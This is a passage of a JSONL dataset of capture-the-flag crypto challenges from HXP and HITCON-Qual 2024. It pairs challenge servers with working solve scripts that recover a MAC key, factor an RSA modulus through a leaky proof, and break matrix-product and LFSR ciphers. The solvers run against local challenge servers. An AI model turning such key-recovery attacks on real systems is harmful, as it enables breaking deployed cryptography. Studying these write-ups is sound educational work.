generate_special_message(tlen)[1:].hex().encode())\n        mask_poly = P(F(int_to_poly(1 << (8*tlen + 8))) ** 1000000)\n        M = polynomial_to_circulant_matrix(mask_poly, 128, f)\n        # M_ = (F(int_to_poly(1 << (8*tlen + 8))) ** 1000000).matrix()\n        # assert M == M_.T\n        leak = ZZ(int(io.recvline().strip().decode(), 16))\n        leak_bits = [(leak >> i) & 1 for i in range(64)]\n        assert len(leak_bits) == 64 and leak < 2**64\n        eqs += [M.column(i + 64) for i in range(64)]\n        leaks += leak_bits\n    mat = matrix(GF(2), eqs)\n    vec = vector(GF(2), leaks)\n    sol = mat.solve_right(vec)\n    kpoly = F(sol.list())\n    c = [poly_to_hex(i) for i in kpoly.nth_root(1000000, all=True)]\n    print(f\"submit {c[0]}\")\n    io.sendline(b\"solve \" + c[0].encode())\n    res = io.recvline()\n    print(res.decode().strip())\n    if b\"hxp\" in res:\n        break\n    io.close()", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\cccccircus\\solve\\vuln.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nf = 0x1f3267f571be716d65f11ecb21b86d2e9\n\ndef to_bits(bs):\n    return int.from_bytes(bs)\n\ndef from_bits(v):\n    return int.to_bytes(v, 8)\n\ndef red(x):\n    while (l := x.bit_length()) > 128:\n        x ^= f << l - 129\n    return x\n\ndef mul(x, y):\n    z = 0\n    for i in range(x.bit_length()):\n        if (x >> i) & 1:\n            z ^= y << i\n    return red(z)\n\ndef exp(x, n):\n    assert n >= 0\n    if not n:\n        return 1\n    if n % 2:\n        return mul(x, exp(x, n-1))\n    return exp(mul(x, x), n//2)\n\nclass Mac:\n    def __init__(self, key):\n        self.key = key\n\n    def __call__(self, msg):\n        tag = exp(to_bits(self.key + bytes([len(msg)]) + msg), 1000000)\n        return from_bits(tag >> 64)\n\nif __name__ == '__main__':\n    import os, signal\n    signal.alarm(60)\n\n    mac = Mac(os.urandom(32))\n    for _ in range(99):\n        try:\n            inp = input().strip().split(' ')\n        except EOFError:\n            exit()\n        cmd, data = inp[0], bytes.fromhex(inp[1])\n        if cmd == 'solve':\n            break\n        if cmd == 'query':\n            print(mac(data).hex())\n        else:\n            print('bad command')\n    else:\n        print('no more')\n        exit()\n\n    key = bytes.fromhex(inp[1])\n    mac_ = Mac(key)\n    for l in range(256):\n        msg = os.urandom(l)\n        if Mac(key)(msg) != mac(msg):\n            print('wrong key')\n            break\n    else:\n        print(open('flag.txt').read().strip())\n\n", "name": "vuln"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\zkpok\\challenge\\server.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nfrom Crypto.Util.number import getPrime, getRandomRange\nfrom math import floor\nimport json, random, os\n\n# https://www.di.ens.fr/~stern/data/St84.pdf\nA = 2**1000\nB = 2**80\n\n\ndef keygen():\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    return n, phi\n\n\ndef zkpof(z, n, phi):\n    # I act as the prover\n    r = getRandomRange(0, A)\n    x = pow(z, r, n)\n    e = int(input(\"e = \"))\n    if e >= B:\n        raise ValueError(\"e too large\")\n    y = r + (n - phi) * e\n    transcript = {\"x\": x, \"e\": e, \"y\": y}\n    return json.dumps(transcript)\n\n\ndef zkpof_reverse(z, n):\n    # You act as the prover\n    x = int(input(\"x = \"))\n    e = getRandomRange(0, B)\n    print(f\"{e = }\")\n    y = int(input(\"y = \"))\n    transcript = {\"x\": x, \"e\": e, \"y\": y}\n    return json.dumps(transcript)\n\n\ndef zkpof_verify(z, t, n):\n    transcript = json.loads(t)\n    x, e, y = [transcript[k] for k in (\"x\", \"e\", \"y\")]\n    return 0 <= y < A and pow(z, y - n * e, n) == x\n\n\nif __name__ == \"__main__\":\n    n, phi = keygen()\n    print(f\"{n = }\")\n\n    rand = random.Random(1337)  # public, fixed generator for z\n    for _ in range(0x137):\n        try:\n            z = rand.randrange(2, n)\n            t = zkpof(z, n, phi)\n            assert zkpof_verify(z, t, n)\n            print(t)\n            if input(\"Still not convined? [y/n] \").lower()[0] != \"y\":\n                break\n        except Exception as e:\n            print(f\"Error: {e}\")\n    print(\n        \"You should now be convinced that I know the factorization of n without revealing anything about it. Right?\"\n    )\n    for _ in range(floor(13.37)):\n        z = rand.randrange(2, n)\n        t = zkpof_reverse(z, n)\n        assert zkpof_verify(z, t, n)\n        print(t)\n    print(os.environ.get(\"FLAG\", \"flag{test}\"))\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\zkpok\\solve\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, process, log\nimport gmpy2\nfrom Crypto.Util.number import getPrime, getRandomRange, GCD\nfrom sage.all import PolynomialRing, Zmod\nimport json\nimport random\n\nlocal = True\nA = 2**1000\nB = 2**80\n\nif local:\n    io = process([\"python3\", \"server.py\"])\nelse:\n    io = remote(\"localhost\", 1337)\n    \nn = int(io.recvline().decode().strip().split(\" = \")[1])\n    \ndef zkpof_verifier(io: remote, e: int):\n    io.sendlineafter(b\"e = \", str(e).encode())\n    return io.recvline().decode()\n\ndef zkpof_prover(io:remote, n, z, phi):\n    r = getRandomRange(0, A)\n    x = pow(z, r, n)\n    io.sendlineafter(b\"x = \", str(x).encode())\n    io.recvuntil(b\"e = \")\n    e = int(io.recvline().decode().strip())\n    y = r + (n - phi) * e\n    io.sendlineafter(b\"y = \", str(y).encode())\n    \n\n\n# let c = n - phi = p + q - 1\n# y = r +  c * e\nlb = 1\nub = 2**513\nbound_y = 10**4300\nrand = random.Random(1337)\n\nfor i in range(0x137):\n    z = rand.randrange(2, n)\n    mid = (lb + ub) // 2\n    estimated_e = -bound_y // mid\n    response = zkpof_verifier(io, estimated_e)\n    if \"Exceeds\" in response:\n        # c*estimated_e > bound_y > mid * estimated_e\n        # c > mid\n        lb = mid\n    else:\n        ub = mid\n\nlog.info(f\"lb = {lb}\")\nlog.info(f\"ub = {ub}\")\n\n# we have approximately 0x137 bits of p+q - 1 i.e. 0x137 bits of p+q\np_plus_q = (lb + ub) // 2\np_minus_q = int(gmpy2.isqrt(abs(p_plus_q**2 - 4 * n)))\np_h = (p_plus_q + p_minus_q) // 2\npoly_ring = PolynomialRing(Zmod(n), 'x')\nx = poly_ring.gen()\nf = p_h + x\nx0 = int(f.small_roots(beta=0.495, X=2**(512 - 0x137 + 3), epsilon=0.02)[0])\n\np = GCD(p_h + x0, n)\nq = n // p\nassert p * q == n\nlog.info(\"Successfully factored n\")\n\nphi = (p - 1) * (q - 1)\n\nfor i in range(13):\n    z = rand.randrange(2, n)\n    zkpof_prover(io, n, z, phi)\n    \nio.recvline().decode()\nlog.info(io.recvline().decode())\n\n", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\zkpok\\solve\\server.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nfrom Crypto.Util.number import getPrime, getRandomRange\nfrom math import floor\nimport json, random, os\n\n# https://www.di.ens.fr/~stern/data/St84.pdf\nA = 2**1000\nB = 2**80\n\n\ndef keygen():\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    return n, phi\n\n\ndef zkpof(z, n, phi):\n    # I act as the prover\n    r = getRandomRange(0, A)\n    x = pow(z, r, n)\n    e = int(input(\"e = \"))\n    if e >= B:\n        raise ValueError(\"e too large\")\n    y = r + (n - phi) * e\n    transcript = {\"x\": x, \"e\": e, \"y\": y}\n    return json.dumps(transcript)\n\n\ndef zkpof_reverse(z, n):\n    # You act as the prover\n    x = int(input(\"x = \"))\n    e = getRandomRange(0, B)\n    print(f\"{e = }\")\n    y = int(input(\"y = \"))\n    transcript = {\"x\": x, \"e\": e, \"y\": y}\n    return json.dumps(transcript)\n\n\ndef zkpof_verify(z, t, n):\n    transcript = json.loads(t)\n    x, e, y = [transcript[k] for k in (\"x\", \"e\", \"y\")]\n    return 0 <= y < A and pow(z, y - n * e, n) == x\n\n\nif __name__ == \"__main__\":\n    n, phi = keygen()\n    print(f\"{n = }\")\n\n    rand = random.Random(1337)  # public, fixed generator for z\n    for _ in range(0x137):\n        try:\n            z = rand.randrange(2, n)\n            t = zkpof(z, n, phi)\n            assert zkpof_verify(z, t, n)\n            print(t)\n            if input(\"Still not convined? [y/n] \").lower()[0] != \"y\":\n                break\n        except Exception as e:\n            print(f\"Error: {e}\")\n    print(\n        \"You should now be convinced that I know the factorization of n without revealing anything about it. Right?\"\n    )\n    for _ in range(floor(13.37)):\n        z = rand.randrange(2, n)\n        t = zkpof_reverse(z, n)\n        assert zkpof_verify(z, t, n)\n        print(t)\n    print(os.environ.get(\"FLAG\", \"flag{test}\"))\n", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\matprod\\challenge\\chall.py", "category": "crypto", "solution_code": "from sage.all import *\nfrom random import Random, SystemRandom\nfrom hashlib import sha256\nfrom Crypto.Cipher import AES\n\n# https://eprint.iacr.org/2023/1745.pdf\n\n\nclass BaseMatrixProductCryptosystem:\n    def __init__(self, n: int, k: int, a: int, p: int):\n        self.n = n\n        self.k = k\n        self.a = a\n        self.p = p\n        self.F = GF(p)\n\n    def rand_drawf(self, rand: Random, check=True, ring=None):\n        if ring is None:\n            ring = self.F\n        while True:\n            M = matrix(\n                ZZ,\n                self.n,\n                self.n,\n                [rand.randint(0, self.a) for _ in range(self.n * self.n)],\n            )\n            det = M.det()\n            if not check or det % self.p != 0:\n                return M.change_ring(ring)\n\n    def rand_elf(self, rand: Random, check=True, ring=None):\n        if ring is None:\n            ring = self.F\n        while True:\n            M = matrix(\n                ZZ,\n                self.n,\n                self.n,\n                [rand.randrange(0, self.p) for _ in range(self.n * self.n)],\n            )\n            det = M.det()\n            if not check or det % self.p != 0:\n                return M.change_ring(ring)\n\n\nclass DirectMatrixProductCryptosystem(BaseMatrixProductCryptosystem):\n    def keygen(self, rand: Random):\n        As = [self.rand_drawf(rand) for _ in range(self.k)]\n        D = self.rand_drawf(rand)\n        E = self.rand_elf(rand)\n        Ei = E.inverse()\n        priv = (As, D, E, Ei)\n        pub = [E * A * D * Ei for A in As]\n        return priv, pub\n\n    def encrypt_perm(self, pub, perm):\n        M = pub[perm[0]]\n        for i in range(1, self.k):\n            M = M * pub[perm[i]]\n        return M\n\n    def decompose(self, M, As, D, L):\n        if len(L) == len(As):\n            return\n        if len(As) - 1 == len(L):\n            idx = next(iter(set(range(len(As))) - set(L)))\n            if As[idx] == M:\n                return L + [idx]\n            return\n        threshold = self.n * (self.n - 1)\n        for i, A in enumerate(As):\n            if i in L:\n                continue\n            try:\n                Mp = D.solve_right(A.solve_right(M))\n            except ValueError:\n                continue\n            # if all(int(x) <= int(y) for x, y in zip(Mp.list(), M.list())):\n            # this is a bit different from the paper\n            # because the provided decryption algorithm in the paper often fail to decrypt till the end\n            smaller_cnt = len(\n                [1 for x, y in zip(Mp.list(), M.list()) if int(x) <= int(y)]\n            )\n            if smaller_cnt >= threshold:\n                ret = self.decompose(Mp, As, D, L + [i])\n                if ret is not None:\n                    return ret\n\n    def decrypt_perm(self, priv, M):\n        As, D, E, Ei = priv\n        R = Ei * M * E * ~D\n        return self.decompose(R, As, D, [])\n\n    def encode(self, m):\n        P = Permutations(self.k)\n        if m < 0 or m > P.cardinality():\n            raise ValueError(\"Invalid message\")\n        return [x - 1 for x in P.unrank(m)]\n\n    def decode(self, p):\n        P = Permutations(self.k)\n        return P.rank([x + 1 for x in p])\n\n    def encrypt(self, pub, m):\n        return self.encrypt_perm(pub, self.encode(m))\n\n    def decrypt(self, priv, M):\n        ret = self.decrypt_perm(priv, M)\n        if ret is not None:\n            return self.decode(ret)\n\n    def randmsg(self, rand: Random):\n        return rand.randrange(0, factorial(self.k))\n\n\nclass AlternatingMatrixProductCryptosystem(BaseMatrixProductCryptosystem):\n    def rand_pair_drawf(self, rand: Random, lookup: dict):\n        while True:\n            A = self.rand_drawf(\n                rand, check=False, ring=ZZ\n            )  # computing determinant in ZZ is so much faster than in GF(p) ...\n            d = A.det()\n            if d == 0:\n                continue\n            if d in lookup and lookup[d] != A:\n                AA = lookup.pop(d)\n                return A.change_ring(self.F), AA.change_ring(self.F)\n            lookup[d] = A\n\n    def keygen(self, rand: Random):\n        lookup = {}\n        As = [self.rand_pair_drawf(rand, lookup) for _ in range(self.k)]\n        Es = [self.rand_elf(rand) for _ in range(self.k + 1)]\n        ABars = []\n        for i in range(self.k):\n            cur = []\n            for b in (0, 1):\n                cur.append(Es[i] * As[i][b] * ~Es[i + 1])\n            ABars.append(cur)\n        priv = (Es[0], Es[self.k], As)\n        pub = ABars\n        return priv, pub\n\n    def encrypt_bits(self, pub, bits):\n        M = pub[0][bits[0]]\n        for i in range(1, self.k):\n            M = M * pub[i][bits[i]]\n        return M\n\n    def decompose(self, M, As):\n        threshold = self.n * (self.n - 1)\n        bits = []\n        for i in range(self.k):\n            for b in (0, 1):\n                A = As[i][b]\n                try:\n                    Mp = A.solve_right(M)\n                except ValueError:\n                    continue\n  ", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\matprod\\solve\\break_alternating.py", "category": "crypto", "solution_code": "from chall import AlternatingMatrixProductCryptosystem\nfrom random import SystemRandom\nfrom hashlib import sha256\nfrom itertools import product\nfrom Crypto.Cipher import AES\nfrom sage.all import matrix, ZZ, Zmod, randint, prod, log, GF, block_matrix, vector\nfrom tqdm import tqdm\n\n# Break AlternatingMatrixProductCryptosystem of https://eprint.iacr.org/2023/1745.pdf\n\n# https://github.com/Neobeo/HackTM2023/blob/main/solve420.sage\ndef flatter(M):\n    from subprocess import check_output\n    from re import findall\n    M = matrix(ZZ,M)\n    # compile https://github.com/keeganryan/flatter and put it in $PATH\n    z = '[[' + ']\\n['.join(' '.join(map(str,row)) for row in M) + ']]'\n    ret = check_output([\"flatter\"], input=z.encode())\n    return matrix(M.nrows(), M.ncols(), map(int,findall(b'-?\\\\d+', ret)))\n\ndef gen_alternating_challenge_local(flag=None, paras=(10, 64, 2, 2**553 + 549)):\n    rand = SystemRandom()\n    H = sha256()\n    cry = AlternatingMatrixProductCryptosystem(*paras)\n    priv, pub = cry.keygen(rand)\n    msg = cry.randmsg(rand)\n    M = cry.encrypt(pub, msg)\n    if cry.decrypt(priv, M) != msg:\n        raise ValueError(\"Decryption failed\")\n    H.update(str(msg).encode())\n    challenge = (pub, M)\n\n    if flag is None:\n        flag = b\"flag{\" + rand.randbytes(16).hex().encode() + b\"}\"\n    cipher = AES.new(H.digest(), AES.MODE_CTR)\n    enc_flag = cipher.encrypt(flag)\n\n    return {\"challenge\": challenge, \"enc_flag\": enc_flag, \"nonce\": cipher.nonce}, msg\n\ndef estimate_trace_bound(n, a, k):\n    # https://eprint.iacr.org/2023/1745.pdf\n    # The strict upper bound of the trace is too large in Corollary 1.\n    # I don't find good formula to estimate the general trace bound, \n    # so I just use the average trace value of the random product matrix as the estimation.\n    if k == 0:\n        return n\n    Ms = []\n    for i in range(k):\n        M = matrix(\n            ZZ,\n            n,\n            n,\n            [randint(0, a) for _ in range(n * n)],\n        )\n        Ms.append(M)\n        \n    pM = prod(Ms)\n    # avg_pm = sum(pM.list()) // (n * n)\n    # upper_bound = n * (a*n)**(k-1)\n    return pM.trace() * 2\n\n\ndef gen_partial_ciphertext(pubkey, i, j, n_samples):\n    \"\"\" Generate `n_samples` partial ciphertexts from index i to j including i.\n\n    Args:\n        pubkey (list): [A^0, A^1], two matrix sets.\n        i (int): the start index\n        j (int): the end index (exclusive)\n        n_samples (int): the number of partial ciphertexts to generate\n        \n    Returns:\n        list: the list of partial ciphertexts\n    \"\"\"\n    # print(f\"Generating partial ciphertexts from {i} to {j} with {n_samples} samples\")\n    Cs = []\n    if 2**(j - i + 1) < n_samples:\n        for num in range(2**(j - i)):\n            bits = [int(bit) for bit in bin(num)[2:].zfill(j-i)]\n            C = prod([pubkey[idx][bit] for idx, bit in enumerate(bits, start=i)]).list()\n            Cs.append(C)\n        return Cs\n         \n    while len(Cs) != n_samples:\n        randbits = [randint(0, 1) for _ in range(j-i)]\n        C = prod([pubkey[idx][bit] for idx, bit in enumerate(randbits, start=i)]).list()\n        if C not in Cs:\n            Cs.append(C)\n    return Cs\n\n\ndef modulo_reduction(M, p, verbose=False):\n    \"\"\" Perform LLL reduction on the matrix M with modulo p.\n\n    Args:\n        M (matrix): the matrix to reduce\n        p (int): the modulo\n        verbose (bool, optional): whether to print the debug information. Defaults to False.\n\n    Returns:\n        matrix: The reduced matrix\n    \"\"\"\n    n, m = M.nrows(), M.ncols()\n    if n < m:\n        Me = M.change_ring(GF(p)).echelon_form()\n        delta = Me.ncols() - n\n        zero_mat = matrix.zero(delta, n)\n        pI = matrix.identity(delta) * p\n        L = block_matrix(ZZ, [[Me], [zero_mat.augment(pI)]])\n        if L.rank() != L.nrows():\n            L = L.echelon_form(algorithm=\"pari0\", include_zero_rows=False, include_zero_columns=False)\n        L = L.change_ring(ZZ)\n    else:\n        pI = matrix.identity(m) * p\n        L = block_matrix(ZZ, [[M], [pI]])\n        \n    if verbose:\n        print(f\"Starts to do LLL reduction with dimensions {L.dimensions()}\")\n    try:\n        L = flatter(L)\n    except Exception as e:\n        print(f\"Failed to use flatter: {e}\")\n        print(f\"Starts to do sage built-in LLL reduction\")\n        L = L.LLL()\n    if verbose: print(f\"Ends LLL reduction\")\n    return L\n\ndef recover_Eij(paras, pubkey, i, j, n_sample = None):\n    \"\"\" Recover the secret Ei*Ej^{-1} from `AlternatingMatrixProductCryptosystem`'s public key.\n\n    Args:\n        paras (tuple): the parameters of the cryptosystem i.e. (n, k, a, p)\n        pubkey (list): [A^0, A^1], two matrix sets.\n        n_sample (int): the number of partial ciphertexts to generate, if None, it will be set as estimated value.\n    \"\"\"\n    assert i > j >= 0, f\"Invalid {i = }, {j = }\"\n    (n, k, a, p) = paras\n    # estimate the trace bound of Aj * A_{j+1} ... A_{i} wher A_i <= alpha\n    trace_bound = int(estimate_trace_bound(n, a, i-j))\n    #", "name": "break_alternating"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\matprod\\solve\\break_direct.py", "category": "crypto", "solution_code": "from chall import alternating, direct, DirectMatrixProductCryptosystem\nfrom random import Random, SystemRandom\nfrom hashlib import sha256\nfrom Crypto.Cipher import AES\nfrom sage.all import load, save, matrix, ZZ, Zmod\n\n\n# Break DirectMatrixProductCryptosystem of https://eprint.iacr.org/2023/1745.pdf\n\n\ndef gen_direct_challenge_local(paras=(10, 35, 2, 2**302 + 307)):\n    rand = SystemRandom()\n    cry = DirectMatrixProductCryptosystem(*paras)\n    priv, pub = cry.keygen(rand)\n    msg = cry.randmsg(rand)\n    M = cry.encrypt(pub, msg)\n    if cry.decrypt(priv, M) != msg:\n        raise ValueError(\"Decryption failed\")\n    challenge = (pub, M)\n    return challenge, msg\n\ndef dfs_search_message(C, pubkey):\n    pubkey_inv = [A ** (-1) for A in pubkey]\n    def dfs_search(current_c, current_path):\n        # print(f\"current_path: {current_path}\")\n        if len(current_path) == len(pubkey_inv) - 1:\n            if current_c in pubkey:\n                # print(f\"[+] possible perm: {current_path}\")\n                yield current_path + [pubkey.index(current_c)]\n        for i in range(len(pubkey_inv)):\n            if i not in current_path:\n                try_mat = pubkey_inv[i]\n                if (try_mat * current_c).trace() <= current_c.trace():\n                    yield from dfs_search(try_mat * current_c, current_path + [i])\n    yield from dfs_search(C, [])\n\ndef break_direct_cryptosystem(paras, pubkey, C):\n    \"\"\" Break the direct cryptosystem, decrypting the ciphertext C.\n\n    Args:\n        paras (tuple): the parameters of the cryptosystem i.e. (n, k, a, p)\n        pubkey (list): list of matrix: bar A\n        C (matrix): the ciphertext: C = prod(sigma, A)\n\n    Returns:\n        list: the decrypted permutation sigma\n    \"\"\"\n    (n, k, a, p) = paras\n    for perm in dfs_search_message(C, pubkey):\n        if perm:\n            print(f\"Found perm {perm}\")\n            direct_cipher = DirectMatrixProductCryptosystem(n, k, a, p)\n            return direct_cipher.decode(perm)\n        \ndef test_break_direct_cryptosystem():\n    (n, k, a, p) = 10, 35, 2, 2**302 + 307\n    direct_paras = (n, k, a, p)\n    (pubkey, C), msg = gen_direct_challenge_local(direct_paras)\n    sol = break_direct_cryptosystem(direct_paras, pubkey, C)\n    assert sol == msg, f\"Failed: {sol} != {msg}\"\n    print(\"Passed test_break_direct_cryptosystem\")\n\nif __name__ == \"__main__\":\n    test_break_direct_cryptosystem()", "name": "break_direct"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\matprod\\solve\\chall.py", "category": "crypto", "solution_code": "from sage.all import *\nfrom random import Random, SystemRandom\nfrom hashlib import sha256\nfrom Crypto.Cipher import AES\n\n# https://eprint.iacr.org/2023/1745.pdf\n\n\nclass BaseMatrixProductCryptosystem:\n    def __init__(self, n: int, k: int, a: int, p: int):\n        self.n = n\n        self.k = k\n        self.a = a\n        self.p = p\n        self.F = GF(p)\n\n    def rand_drawf(self, rand: Random, check=True, ring=None):\n        if ring is None:\n            ring = self.F\n        while True:\n            M = matrix(\n                ZZ,\n                self.n,\n                self.n,\n                [rand.randint(0, self.a) for _ in range(self.n * self.n)],\n            )\n            det = M.det()\n            if not check or det % self.p != 0:\n                return M.change_ring(ring)\n\n    def rand_elf(self, rand: Random, check=True, ring=None):\n        if ring is None:\n            ring = self.F\n        while True:\n            M = matrix(\n                ZZ,\n                self.n,\n                self.n,\n                [rand.randrange(0, self.p) for _ in range(self.n * self.n)],\n            )\n            det = M.det()\n            if not check or det % self.p != 0:\n                return M.change_ring(ring)\n\n\nclass DirectMatrixProductCryptosystem(BaseMatrixProductCryptosystem):\n    def keygen(self, rand: Random):\n        As = [self.rand_drawf(rand) for _ in range(self.k)]\n        D = self.rand_drawf(rand)\n        E = self.rand_elf(rand)\n        Ei = E.inverse()\n        priv = (As, D, E, Ei)\n        pub = [E * A * D * Ei for A in As]\n        return priv, pub\n\n    def encrypt_perm(self, pub, perm):\n        M = pub[perm[0]]\n        for i in range(1, self.k):\n            M = M * pub[perm[i]]\n        return M\n\n    def decompose(self, M, As, D, L):\n        if len(L) == len(As):\n            return\n        if len(As) - 1 == len(L):\n            idx = next(iter(set(range(len(As))) - set(L)))\n            if As[idx] == M:\n                return L + [idx]\n            return\n        threshold = self.n * (self.n - 1)\n        for i, A in enumerate(As):\n            if i in L:\n                continue\n            try:\n                Mp = D.solve_right(A.solve_right(M))\n            except ValueError:\n                continue\n            # if all(int(x) <= int(y) for x, y in zip(Mp.list(), M.list())):\n            # this is a bit different from the paper\n            # because the provided decryption algorithm in the paper often fail to decrypt till the end\n            smaller_cnt = len(\n                [1 for x, y in zip(Mp.list(), M.list()) if int(x) <= int(y)]\n            )\n            if smaller_cnt >= threshold:\n                ret = self.decompose(Mp, As, D, L + [i])\n                if ret is not None:\n                    return ret\n\n    def decrypt_perm(self, priv, M):\n        As, D, E, Ei = priv\n        R = Ei * M * E * ~D\n        return self.decompose(R, As, D, [])\n\n    def encode(self, m):\n        P = Permutations(self.k)\n        if m < 0 or m > P.cardinality():\n            raise ValueError(\"Invalid message\")\n        return [x - 1 for x in P.unrank(m)]\n\n    def decode(self, p):\n        P = Permutations(self.k)\n        return P.rank([x + 1 for x in p])\n\n    def encrypt(self, pub, m):\n        return self.encrypt_perm(pub, self.encode(m))\n\n    def decrypt(self, priv, M):\n        ret = self.decrypt_perm(priv, M)\n        if ret is not None:\n            return self.decode(ret)\n\n    def randmsg(self, rand: Random):\n        return rand.randrange(0, factorial(self.k))\n\n\nclass AlternatingMatrixProductCryptosystem(BaseMatrixProductCryptosystem):\n    def rand_pair_drawf(self, rand: Random, lookup: dict):\n        while True:\n            A = self.rand_drawf(\n                rand, check=False, ring=ZZ\n            )  # computing determinant in ZZ is so much faster than in GF(p) ...\n            d = A.det()\n            if d == 0:\n                continue\n            if d in lookup and lookup[d] != A:\n                AA = lookup.pop(d)\n                return A.change_ring(self.F), AA.change_ring(self.F)\n            lookup[d] = A\n\n    def keygen(self, rand: Random):\n        lookup = {}\n        As = [self.rand_pair_drawf(rand, lookup) for _ in range(self.k)]\n        Es = [self.rand_elf(rand) for _ in range(self.k + 1)]\n        ABars = []\n        for i in range(self.k):\n            cur = []\n            for b in (0, 1):\n                cur.append(Es[i] * As[i][b] * ~Es[i + 1])\n            ABars.append(cur)\n        priv = (Es[0], Es[self.k], As)\n        pub = ABars\n        return priv, pub\n\n    def encrypt_bits(self, pub, bits):\n        M = pub[0][bits[0]]\n        for i in range(1, self.k):\n            M = M * pub[i][bits[i]]\n        return M\n\n    def decompose(self, M, As):\n        threshold = self.n * (self.n - 1)\n        bits = []\n        for i in range(self.k):\n            for b in (0, 1):\n                A = As[i][b]\n                try:\n                    Mp = A.solve_right(M)\n                except ValueError:\n                    continue\n  ", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\hyper512\\challenge\\chall.py", "category": "crypto", "solution_code": "import secrets\nfrom hashlib import sha256\n\nMASK1 = 0x6D6AC812F52A212D5A0B9F3117801FD5\nMASK2 = 0xD736F40E0DED96B603F62CBE394FEF3D\nMASK3 = 0xA55746EF3955B07595ABC13B9EBEED6B\nMASK4 = 0xD670201BAC7515352A273372B2A95B23\n\n\nclass LFSR:\n    def __init__(self, n, key, mask):\n        self.n = n\n        self.state = key & ((1 << n) - 1)\n        self.mask = mask\n\n    def __call__(self):\n        b = self.state & 1\n        self.state = (self.state >> 1) | (\n            ((self.state & self.mask).bit_count() & 1) << (self.n - 1)\n        )\n        return b\n\n\nclass Cipher:\n    def __init__(self, key: int):\n        self.lfsr1 = LFSR(128, key, MASK1)\n        key >>= 128\n        self.lfsr2 = LFSR(128, key, MASK2)\n        key >>= 128\n        self.lfsr3 = LFSR(128, key, MASK3)\n        key >>= 128\n        self.lfsr4 = LFSR(128, key, MASK4)\n\n    def bit(self):\n        x = self.lfsr1() ^ self.lfsr1() ^ self.lfsr1()\n        y = self.lfsr2()\n        z = self.lfsr3() ^ self.lfsr3() ^ self.lfsr3() ^ self.lfsr3()\n        w = self.lfsr4() ^ self.lfsr4()\n        return (\n            sha256(str((3 * x + 1 * y + 4 * z + 2 * w + 3142)).encode()).digest()[0] & 1\n        )\n\n    def stream(self):\n        while True:\n            b = 0\n            for i in reversed(range(8)):\n                b |= self.bit() << i\n            yield b\n\n    def encrypt(self, pt: bytes):\n        return bytes([x ^ y for x, y in zip(pt, self.stream())])\n\n    def decrypt(self, ct: bytes):\n        return self.encrypt(ct)\n\n\nif __name__ == \"__main__\":\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n    key = secrets.randbits(512)\n    cipher = Cipher(key)\n    gift = cipher.encrypt(b\"\\x00\" * 2**12)\n    print(gift.hex())\n    ct = cipher.encrypt(flag)\n    print(ct.hex())\n", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\hyper512\\solve\\chall.py", "category": "crypto", "solution_code": "import secrets\nfrom hashlib import sha256\n\nMASK1 = 0x6D6AC812F52A212D5A0B9F3117801FD5\nMASK2 = 0xD736F40E0DED96B603F62CBE394FEF3D\nMASK3 = 0xA55746EF3955B07595ABC13B9EBEED6B\nMASK4 = 0xD670201BAC7515352A273372B2A95B23\n\n\nclass LFSR:\n    def __init__(self, n, key, mask):\n        self.n = n\n        self.state = key & ((1 << n) - 1)\n        self.mask = mask\n\n    def __call__(self):\n        b = self.state & 1\n        self.state = (self.state >> 1) | (\n            ((self.state & self.mask).bit_count() & 1) << (self.n - 1)\n        )\n        return b\n\n\nclass Cipher:\n    def __init__(self, key: int):\n        self.lfsr1 = LFSR(128, key, MASK1)\n        key >>= 128\n        self.lfsr2 = LFSR(128, key, MASK2)\n        key >>= 128\n        self.lfsr3 = LFSR(128, key, MASK3)\n        key >>= 128\n        self.lfsr4 = LFSR(128, key, MASK4)\n\n    def bit(self):\n        x = self.lfsr1() ^ self.lfsr1() ^ self.lfsr1()\n        y = self.lfsr2()\n        z = self.lfsr3() ^ self.lfsr3() ^ self.lfsr3() ^ self.lfsr3()\n        w = self.lfsr4() ^ self.lfsr4()\n        return (\n            sha256(str((3 * x + 1 * y + 4 * z + 2 * w + 3142)).encode()).digest()[0] & 1\n        )\n\n    def stream(self):\n        while True:\n            b = 0\n            for i in reversed(range(8)):\n                b |= self.bit() << i\n            yield b\n\n    def encrypt(self, pt: bytes):\n        return bytes([x ^ y for x, y in zip(pt, self.stream())])\n\n    def decrypt(self, ct: bytes):\n        return self.encrypt(ct)\n\n\nif __name__ == \"__main__\":\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n    key = secrets.randbits(512)\n    cipher = Cipher(key)\n    gift = cipher.encrypt(b\"\\x00\" * 2**12)\n    print(gift.hex())\n    ct = cipher.encrypt(flag)\n    print(ct.hex())\n", "name": "chall"}
